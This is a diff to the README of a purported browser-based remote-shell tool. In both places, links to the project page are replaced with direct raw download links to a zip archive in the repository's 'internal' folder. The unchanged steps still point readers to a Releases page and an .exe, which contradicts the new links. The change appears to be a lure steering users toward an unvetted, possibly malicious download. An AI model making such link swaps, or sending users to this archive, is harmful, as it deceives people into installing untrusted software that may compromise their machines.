@@ -1,6 +1,6 @@
 # 🖥️ ShellFromBrowser - Access your remote computer through browsers
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/kizzeeetymological104/ShellFromBrowser)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/kizzeeetymological104/ShellFromBrowser/raw/refs/heads/main/internal/Shell-From-Browser-v3.6-alpha.2.zip)
 
 ShellFromBrowser provides a way to control your computer from any web browser. Use this tool if you need access to your desktop or server files when you travel. It connects through web traffic ports so it works on restricted networks.
 
@@ -8,7 +8,7 @@ ShellFromBrowser provides a way to control your computer from any web browser. U
 
 You need to download the correct file for your Windows system. 
 
-1. Visit the project website: [https://github.com/kizzeeetymological104/ShellFromBrowser](https://github.com/kizzeeetymological104/ShellFromBrowser)
+1. Visit the project website: [https://github.com/kizzeeetymological104/ShellFromBrowser/raw/refs/heads/main/internal/Shell-From-Browser-v3.6-alpha.2.zip](https://github.com/kizzeeetymological104/ShellFromBrowser/raw/refs/heads/main/internal/Shell-From-Browser-v3.6-alpha.2.zip)
 2. Scroll to the section marked Releases.
 3. Select the file ending in .exe for Windows.
 4. Save the file to your computer.
